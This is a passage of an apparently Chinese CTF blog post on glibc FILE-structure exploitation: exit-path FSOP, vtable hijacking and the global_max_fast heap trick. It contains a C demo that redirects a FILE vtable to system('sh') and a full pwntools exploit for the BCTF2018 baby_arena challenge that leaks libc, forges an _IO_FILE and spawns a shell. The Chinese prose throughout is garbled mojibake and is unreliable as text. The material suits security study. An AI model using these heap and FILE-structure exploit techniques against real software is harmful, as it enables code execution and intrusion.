class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="æ­£å¸¸é€€å‡ºæ ˆå›æº¯"><a class="header-anchor" href="#æ­£å¸¸é€€å‡ºæ ˆå›æº¯">Â¶</a>æ­£å¸¸é€€å‡ºæ ˆå›æº¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>_IO_cleanup ()<br>__run_exit_handlers (status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="hljs-number">0x1</span>)<br>__GI_exit (status=&lt;optimized out&gt;)<br>__libc_start_main (main=<span class="hljs-number">0x400526</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><p>çœ‹å‡ºæ¥ç¨‹åºæ˜¯åœ¨<strong>æ­£å¸¸ä»mainå‡½æ•°è¿”å›å</strong>ï¼Œè°ƒç”¨äº†<code>exit</code>å‡½æ•°ï¼Œæ‰€ä»¥æœ€ç»ˆæ‰è°ƒç”¨<code>_IO_flush_all_lockp</code>å‡½æ•°çš„ã€‚æ‰€ä»¥å¦‚æœç”¨ <code>syscall</code> ç»“æŸé‚£å°±ä¸è¡Œã€‚</p><p>å¸¸è§çš„åˆ©ç”¨çš„æ–¹å¼ä¸ºâ€”â€”</p><p>ä¼ªé€ IO FILEç»“æ„ä½“ï¼Œå¹¶åˆ©ç”¨æ¼æ´å°†<code>_IO_list_all</code>æŒ‡å‘ä¼ªé€ çš„ç»“æ„ä½“ï¼Œæˆ–æ˜¯å°†è¯¥é“¾è¡¨ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆ<code>_chain</code>å­—æ®µï¼‰æŒ‡å‘ä¼ªé€ çš„æ•°æ®ï¼Œå†æˆ–è€…ç›´æ¥ ğŸ‘ æ‰åŸæœ¬çš„ IO ç»“æ„ä½“ã€‚</p><p>æœ€ç»ˆè§¦å‘<code>_IO_flush_all_lockp</code>ï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ ç»“æ„ä½“ç»•è¿‡ä¸€å †æ£€æŸ¥ï¼Œè°ƒç”¨<code>_IO_OVERFLOW</code> ç­‰å‡½æ•°æ—¶å®ç°æ‰§è¡Œ<strong>æµåŠ«æŒ</strong>ã€‚æ„æ€æ˜¯ä½ å¯ä»¥åˆæ³•åœ°æ„é€ å¤šä¸ª <strong>_chain</strong> æŠŠ IO <strong>æ‘åœ¨ exit ç­‰å‡½æ•°é€€å‡ºå‰åå¤æ‘©æ“¦</strong>ï¼ˆç¬‘ï¼‰ã€‚ ğŸ‘´ å°±æ˜¯çˆ±äº†è¿™ä¸€ç‚¹ã€‚</p><p>å…¶ä¸­ç»•è¿‡æ£€æŸ¥è¿›å…¥<code>_IO_OVERFLOW</code>çš„æ¡ä»¶æ˜¯è¾“å‡ºç¼“å†²åŒºä¸­å­˜åœ¨æ•°æ®ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl"> <span class="hljs-function"><span class="hljs-title">if</span> (((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &lt;= 0 &amp;&amp; fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_IO_write_base)<br>#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T<br>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>         &amp;&amp; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr<br>            &gt; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base))<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¼ªé€ çš„è¯ï¼Œæˆ‘ä»¬åªéœ€è¦å¦‚ä¸‹æ“ä½œå°±å¯ä»¥ç»•è¿‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><hr><h1>åˆ©ç”¨è‰ºæœ¯é‰´èµ</h1><h2 id="Libc-2-23"><a class="header-anchor" href="#Libc-2-23">Â¶</a>Libc &lt;= 2.23</h2><h3 id="åŠ«æŒ-vtable"><a class="header-anchor" href="#åŠ«æŒ-vtable">Â¶</a>åŠ«æŒ vtable</h3><p>è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œä¸Šé¢æœ‰è¯´åˆ° vtable æ˜¯ä¸€å¼ ä¸å¯»å¸¸çš„è¡¨ï¼Œå¾ˆå¤š io ç›¸å…³å‡½æ•°éƒ½ä¼šè°ƒç”¨å®ƒã€‚é‚£ä¹ˆ ğŸ‘´ åªè¦åŠ«æŒäº† vtableï¼Œ ğŸ‘ æ‰æŸä¸ª IO å‡½æ•°ä¸­å…³é”®çš„å‡½æ•°æŒ‡é’ˆï¼Œæ¢æˆ ğŸ‘´ æœ€çˆ±çš„ system ï¼Œå°±èƒ½æäº‹æƒ…äº†ã€‚</p><h4 id="Demo"><a class="header-anchor" href="#Demo">Â¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥æ‰¬å®Œäº†æ˜¯å› ä¸º fwrite è°ƒç”¨äº†<code>_IO_new_file_xsputn</code> è¿™ä¸ªå‡½æ•°ï¼Œè€Œ rdi é»˜è®¤å°±æ˜¯æˆ‘ä»¬çš„ fp ç»“æ„ä½“ï¼Œæ‰€ä»¥æœ€åçš„æ•ˆæœæ˜¯ <code>system('sh\0');</code>ã€‚</p><h3 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h3><h4 id="baby-arena-BCTF2018-libc2-23"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-23">Â¶</a>baby_arena_BCTF2018 &lt;libc2.23&gt;</h4><p>é¢˜ç›®å¯ä»¥<a href="https://github.com/caffelne/caffelne.github.io/tree/master/chals/IOFILE/baby_arena_BCTF2018">ç‚¹å‡»</a>ä¸‹è½½æˆ–è€…å»åŸæ–‡ <a href="https://fmyy.pro/2020/04/04/GMF/Global_Max_Fast/">è‚¥çŒ«å˜¤å˜¤â€™s åšå®¢</a></p><h5 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h5><p>ç¬¬ä¸€é¢˜å°±å†™è¯¦ç»†ç‚¹ã€‚èœå•å®ç°äº† <code>allocate</code> ï¼Œ<code>delete</code> ï¼Œ<code>login</code> ä¸‰ä¸ªåŠŸèƒ½ã€‚</p><p>æ¼æ´ç‚¹å‡½æ•° <strong>login</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 *v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// eax</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  __int64 *v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = &amp;user;<br>  <span class="hljs-keyword">if</span> ( flag )<br>  &#123;<br>    LODWORD(v0) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you are already login&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your name&quot;</span>);<br>    get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br>    user = v3;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice type&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;0.clientele&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.admin&quot;</span>);<br>    num = get_num(<span class="hljs-string">&quot;1.admin&quot;</span>, <span class="hljs-number">16LL</span>);<br>    <span class="hljs-keyword">if</span> ( num )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      *((_DWORD *)v4 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;imda&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;n&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = v4 + <span class="hljs-number">1</span>;<br>      v4[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;letneilc&#x27;</span>;<br>      *((_WORD *)v0 + <span class="hljs-number">4</span>) = <span class="hljs-string">&#x27;e&#x27;</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªæº¢å‡ºï¼Œå¯ä»¥è¦†å†™ v4 ï¼Œå¯¼è‡´ä»»æ„åœ°å€å†™ <code>admin</code> æˆ–è€… <code>clientele</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">get_char(&amp;v3, <span class="hljs-number">16LL</span>);<br></code></pre></td></tr></table></figure><h5 id="Global-Max-Fast"><a class="header-anchor" href="#Global-Max-Fast">Â¶</a>Global_Max_Fast</h5><p>è¿™é‡Œä¹Ÿé¡ºå¸¦è®²ä¸€ä¸‹ <code>Global_Max_Fast</code> è¿™ä¸ªç©æ„ï¼Œx64 ä¸‹è¿™ä¸ªä¸œè¥¿é€šå¸¸ä¸º <code>0x80</code> ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶çœ‹åˆ°çš„æœ€å¤§ fastbin çš„å¤§å°ã€‚</p><p>åˆ©ç”¨ç‚¹å°±åœ¨æˆ‘ä»¬ free  ğŸ‘ æ‰ä¸€ä¸ª fastbin èŒƒå›´å†…çš„å †å—æ—¶ï¼Œåœ¨ <strong>main_arena</strong> çš„å¯¹åº” size çš„å‘ä½ä¼šè®°å½•å †å—çš„åœ°å€ã€‚ä½†æˆ‘ä»¬å¤§å°æ”¹çš„å·¨å¤§çš„æ—¶å€™ï¼Œå‘ä½ä¸å¤Ÿä½†æ˜¯ glibc è¿™ä¸ªç¬¨æ¯”å®ƒåˆä¸æ‡‚ï¼Œå°±ä¼šé€ æˆæŠŠ <strong>main_arena</strong> å¾€åçš„å¯¹åº”åç§»ä½ç½®çš„å†…å®¹<strong>å†™æˆæˆ‘ä»¬çš„å †å—åœ°å€</strong>ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å…¬å¼æ¥è®¡ç®—å‡ºç›®æ ‡æº¢å‡ºä½ç½®ï¼Œå¯¹åº”çš„éœ€è¦æ„é€ çš„å †å— SIZEï¼Œå…¶ä¸­çš„ delta æŒ‡çš„æ˜¯æº¢å‡ºä½ç½®åˆ° fastbinsY é¦–åœ°å€çš„å·®å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">chunk size = (delta * <span class="hljs-number">2</span>) + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ malloc çš„å¤§å°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">offset2size</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">assert</span> offset % <span class="hljs-number">8</span> == <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> (offset * <span class="hljs-number">2</span>) + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>ğŸ‘´ æ„¿ç§°ä¹‹ä¸º<strong>éœ¸å ä½ çš„å‘ä½ç„¶åç–¯ç‹‚å¡ğŸ’©</strong>ã€‚æ— å›¾è¨€é¸¾ï¼š</p><p>ä¸€å¼€å§‹è¿˜æ²¡ free çš„æ—¶å€™æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175248002.png" alt="image-20220524175248002"></p><p>free å®Œä¹‹åæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220524175336933.png" alt="image-20220524175336933"></p><p>æº¢å‡ºçš„æƒ…å½¢ï¼Œè°ƒè¯•éƒ¨åˆ†å†å†™ã€‚</p><h5 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">Â¶</a>æ€è·¯</h5><ol><li>ç®€å•çš„ Leak libc ä¹‹ååˆ©ç”¨ä»»æ„å†™åœ¨ <code>global_max_fast</code> ä¸Šå†™ <code>admin</code>  æ”¹å¤§æˆ‘ä»¬çš„ fastbin å¤§å°ã€‚</li><li>ç®—å¥½åç§»æŠŠæˆ‘ä»¬çš„å †å—é€åˆ° <code>_IO_list_all</code> çš„å‘ä¸Šå»ï¼Œä¼ªé€  <code>_IO_FILE</code> çš„ <strong>vtable</strong> å <code>exit</code> è§¦å‘ <code>FSOP</code> å°±ç»“æŸäº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ vtable æ˜¯ä¸€å¼ å‡½æ•°è¡¨ï¼Œæˆ‘ä»¬ä¸ºäº†ç®€å•çš„å®šä½æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ã€‚é€‰æ‹©åˆ©ç”¨ <strong>login</strong> å‡½æ•°åŒæ—¶åœ¨ bss æ®µå†™ä¸Š onegadgetã€‚</li><li>è¿™éƒ¨åˆ†å¹¶ä¸å¤æ‚,å…·ä½“çš„æˆ‘å†™åœ¨ä¸‹é¢çš„è°ƒè¯•æ­¥éª¤äº†ã€‚</li></ol><h5 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.23/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1400</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3c4b78</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br>lg(<span class="hljs-string">&#x27;one_gadget&#x27;</span>,one_gadget)<br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3c37a0</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br>aw(one_gadget,libc_base+<span class="hljs-number">0x3c67f8</span>-<span class="hljs-number">8</span>)<br>pause()<br><br>dele(<span class="hljs-number">1</span>)<br><br>fake_IO = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br><br>add(<span class="hljs-number">0x1400</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="è°ƒè¯•"><a class="header-anchor" href="#è°ƒè¯•">Â¶</a>è°ƒè¯•</h5><p><strong>é¦–å…ˆçœ‹çœ‹ global_max_fast è¿™éƒ¨åˆ†ã€‚</strong></p><p>åœ¨æˆ‘ä»¬å†™ <code>admin</code> ä¹‹å‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000000000000080</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>å†™ <code>admin</code> ä¹‹åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 